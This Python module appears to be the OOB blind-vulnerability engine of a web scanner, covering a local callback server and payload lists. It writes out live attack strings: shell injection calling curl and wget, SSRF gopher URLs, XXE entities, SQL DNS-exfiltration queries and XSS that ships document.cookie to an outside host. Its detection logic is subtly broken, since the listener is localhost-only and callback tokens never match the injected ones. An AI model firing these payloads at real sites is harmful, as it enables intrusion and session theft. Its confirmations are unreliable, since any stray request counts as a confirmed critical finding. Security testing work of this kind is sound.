"""ENGINE 4: Blind OOB Discovery (FULL Interactsh-style).

Local OOB callback server with HTTP + DNS listeners.
Injects payloads, polls for callbacks, confirms blind vulnerabilities.
"""
import time
import secrets
import threading
import socket
import struct
import json as _json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from core.logger import log
from core.utils import req_lib, REQUESTS_AVAILABLE
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding

# ── OOB token generation ───────────────────────────────────────────────────────

def _generate_oob_token():
    return f'oob{secrets.token_hex(8)}'

def _get_oob_base():
    with LOCK:
        return scan_state.get('oob_domain', '') or 'oast.pro'

# ── Local OOB callback server ──────────────────────────────────────────────────

class _OOBHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler that records all incoming requests as OOB callbacks."""
    def do_GET(self):
        self._record('http')
    def do_POST(self):
        self._record('http')
    def do_PUT(self):
        self._record('http')
    def _record(self, protocol):
        try:
            token = self.path.strip('/').split('/')[0] if self.path.strip('/') else ''
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8', errors='ignore') if length else ''
            entry = {
                'timestamp': time.time(),
                'protocol': protocol,
                'path': self.path,
                'headers': dict(self.headers),
                'body': body[:2000],
                'source': self.client_address[0],
                'token': token,
            }
            if hasattr(self.server, 'callbacks'):
                self.server.callbacks.append(entry)
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        except Exception:
            self.send_response(500)
            self.end_headers()
    def log_message(self, *args):
        pass

class _OOBDNSServer:
    """Minimal DNS server that resolves *.oob_domain to 127.0.0.1 and records queries."""
    def __init__(self, domain, port=15353):
        self.domain = domain
        self.port = port
        self.queries = []
        self._running = False
        self._server = None

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        try:
            self._server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server.bind(('127.0.0.1', self.port))
            self._server.settimeout(1)
            while self._running:
                try:
                    data, addr = self._server.recvfrom(512)
                    if data:
                        parsed = self._parse_dns_query(data)
                        if parsed:
                            qname, qtype = parsed
                            if self.domain in qname:
                                token = qname.replace(f'.{self.domain}', '').replace(f'.{self.domain}', '')
                                self.queries.append({
                                    'timestamp': time.time(),
                                    'protocol': 'dns',
                                    'query': qname,
                                    'token': token,
                                    'source': addr[0],
                                })
                                response = self._build_dns_response(data, '127.0.0.1')
                                self._server.sendto(response, addr)
                except socket.timeout:
                    continue
                except Exception:
                    pass
        except Exception:
            pass

    def _parse_dns_query(self, data):
        try:
            if len(data) < 12: return None
            qname_parts = []
            i = 12
            while i < len(data):
                length = data[i]
                if length == 0: break
                i += 1
                qname_parts.append(data[i:i+length].decode('utf-8', errors='ignore'))
                i += length
            qname = '.'.join(qname_parts)
            qtype = struct.unpack('>H', data[i:i+2])[0] if i + 2 <= len(data) else 1
            return (qname, qtype)
        except Exception:
            return None

    def _build_dns_response(self, query, answer_ip):
        try:
            response = bytearray(query[:2])
            response[2] = 0x81  # flags: response, no error
            response[3] = 0x80
            response[4:6] = struct.pack('>H', 1)  # questions
            response[6:8] = struct.pack('>H', 1)  # answers
            response[8:10] = struct.pack('>H', 0)  # authority
            response[10:12] = struct.pack('>H', 0)  # additional
            i = 12
            while i < len(query):
                if query[i] == 0: break
                i += 1 + query[i]
            i += 5  # null + qtype + qclass
            # Answer section
            response.extend(query[12:i])  # qname
            response.extend(struct.pack('>HHI', 1, 1, 300))  # type, class, ttl
            ip_parts = [int(x) for x in answer_ip.split('.')]
            response.extend(struct.pack('>BBB', 4, *ip_parts))
            return bytes(response)
        except Exception:
            return query[:2] + b'\x81\x80\x00\x01\x00\x00\x00\x00'

    def stop(self):
        self._running = False
        if self._server:
            try: self._server.close()
            except: pass

class OOBCallbackServer:
    """Full OOB callback server with HTTP + DNS listeners."""
    def __init__(self, token, domain):
        self.token = token
        self.domain = domain
        self.callbacks = []
        self._http_server = None
        self._dns_server = None
        self._http_thread = None

    def start(self, http_port=0, dns_port=15353):
        # Start HTTP listener
        self._http_server = HTTPServer(('127.0.0.1', http_port), _OOBHTTPHandler)
        self._http_server.callbacks = self.callbacks
        self._http_thread = threading.Thread(target=self._http_server.serve_forever, daemon=True)
        self._http_thread.start()
        actual_port = self._http_server.server_address[1]
        # Start DNS listener
        self._dns_server = _OOBDNSServer(self.domain, dns_port)
        self._dns_server.start()
        log('info', f'[OOB] Callback server started: HTTP=127.0.0.1:{actual_port} DNS=127.0.0.1:{dns_port}')
        return actual_port

    def check_callback(self):
        # Check HTTP callbacks
        if self.callbacks:
            return True
        # Check DNS callbacks
        if self._dns_server and self._dns_server.queries:
            self.callbacks.extend(self._dns_server.queries)
            return True
        return False

    def wait_for_callback(self, timeout=30):
        start = time.time()
        while time.time() - start < timeout:
            if self.check_callback():
                return True
            time.sleep(1)
        return False

    def get_callbacks(self):
        # Merge DNS queries
        if self._dns_server:
            for q in self._dns_server.queries:
                if q not in self.callbacks:
                    self.callbacks.append(q)
        return list(self.callbacks)

    def stop(self):
        if self._http_server:
            self._http_server.shutdown()
        if self._dns_server:
            self._dns_server.stop()

# ── Payload generators ─────────────────────────────────────────────────────────

def _build_command_injection_payloads(token, domain):
    fd = f'{token}.{domain}'
    return [f'`nslookup {fd}`', f'; nslookup {fd};', f'| nslookup {fd} |',
            f'$(nslookup {fd})', f'`curl http://{fd}/cb`', f'; curl http://{fd}/cb;',
            f'`wget http://{fd}/cb`', f'; wget http://{fd}/cb;',
            f'`ping -c 1 {fd}`', f'; ping -c 1 {fd};']

def _build_ssrf_payloads(token, domain):
    fd = f'{token}.{domain}'
    return [f'http://{fd}/ssrf', f'https://{fd}/ssrf', f'http://{fd}',
            f'gopher://{fd}:80/_GET / HTTP/1.1%0d%0aHost: {fd}%0d%0a%0d%0a',
            f'dict://{fd}/info']

def _build_xxe_payloads(token, domain):
    fd = f'{token}.{domain}'
    return [f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{fd}/xxe">]><root>&xxe;</root>',
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{fd}/xxe">]><data>&xxe;</data>',
            f'<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://{fd}/xxe.dtd">%dtd;]><root>&send;</root>']

def _build_sqli_dns_payloads(token, domain):
    fd = f'{token}.{domain}'
    return [f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\{fd}\\\\a'))) --",
            f"'; EXEC master..xp_dirtree '//{fd}/a' --",
            f"1' UNION SELECT NULL,(SELECT COPY (SELECT '') TO PROGRAM 'nslookup {fd}') --"]

def _build_xss_oob_payloads(token, domain):
    fd = f'{token}.{domain}'
    return [f'<script>fetch("http://{fd}/xss?c="+document.cookie)</script>',
            f'<script>new Image().src="http://{fd}/xss?c="+document.cookie</script>',
            f'<img src=x onerror="fetch(\'http://{fd}/xss?c=\'+document.cookie)">',
            f'<svg/onload="fetch(\'http://{fd}/xss?c=\'+document.cookie)">']

# ── Engine core ────────────────────────────────────────────────────────────────

class OOBEngine:
    """Blind OOB discovery engine (FULL Interactsh-style)."""

    def __init__(self, target, callback_timeout=30, max_injection_points=50):
        self.target = target
        self.callback_timeout = callback_timeout
        self.max_injection_points = max_injection_points
        self.findings = []
        self.request_count = 0
        self.tokens_used = []
        self._server = None

    def _check_kill_switch(self):
        from scanner.limits import KillSwitch
        return KillSwitch(scan_state.get('scan_id', '')).check()

    def _inject_and_monitor(self, url, param, payloads, vuln_type, method='GET'):
        if not REQUESTS_AVAILABLE or not req_lib: return
        token = _generate_oob_token()
        domain = _get_oob_base()
        self.tokens_used.append(token)
        server = OOBCallbackServer(token, domain)
        server.start()
        for payload in payloads:
            if self.request_count >= self.max_injection_points * 10: break
            if self._check_kill_switch(): break
            try:
                if method == 'GET':
                    resp = req_lib.get(url, params={param: payload}, timeout=10, verify=False)
                else:
                    resp = req_lib.post(url, json={param: payload}, timeout=10, verify=False)
                self.request_count += 1
                if server.wait_for_callback(timeout=min(5, self.callback_timeout)):
                    callbacks = server.get_callbacks()
                    if callbacks:
                        self.findings.append({
                            'type': vuln_type, 'url': url, 'param': param, 'payload': payload,
                            'token': f'{token}.{domain}', 'callbacks': callbacks, 'confidence': 'confirmed',
                        })
                        try:
                            add_finding(
                                sev='critical' if vuln_type in ('command_injection', 'ssrf', 'xxe') else 'high',
                                title=f'Blind {vuln_type.replace("_"," ")} via OOB on {param}',
                                sub=f'OOB engine — {vuln_type}', asset=url,
                                details=f'Token: {token}.{domain}\nPayload: {payload}\nCallbacks: {len(callbacks)}',
                                confidence='confirmed')
                        except Exception:
                            pass
                        server.stop()
                        return
            except Exception:
                pass
        server.stop()

    def run(self, endpoints):
        if not REQUESTS_AVAILABLE:
            return {'findings': [], 'requests': 0, 'tokens_used': []}
        log('info', f'[OOB] Starting against {len(endpoints)} endpoints')
        for url, params, content_type in endpoints:
            if self.request_count >= self.max_injection_points * 10: break
            if self._check_kill_switch(): break
            for param_name in (params or {}):
                if self.request_count >= self.max_injection_points * 10: break
                token = _generate_oob_token()
                domain = _get_oob_base()
                self._inject_and_monitor(url, param_name, _build_command_injection_payloads(token, domain), 'command_injection')
                self._inject_and_monitor(url, param_name, _build_ssrf_payloads(token, domain), 'ssrf')
                if 'xml' in (content_type or ''):
                    self._inject_and_monitor(url, param_name, _build_xxe_payloads(token, domain), 'xxe')
                self._inject_and_monitor(url, param_name, _build_sqli_dns_payloads(token, domain), 'sqli')
                self._inject_and_monitor(url, param_name, _build_xss_oob_payloads(token, domain), 'xss')
        log('ok', f'[OOB] Complete: {len(self.findings)} blind vulns, {self.request_count} requests')
        return {'findings': self.findings, 'tokens_used': self.tokens_used, 'requests': self.request_count}
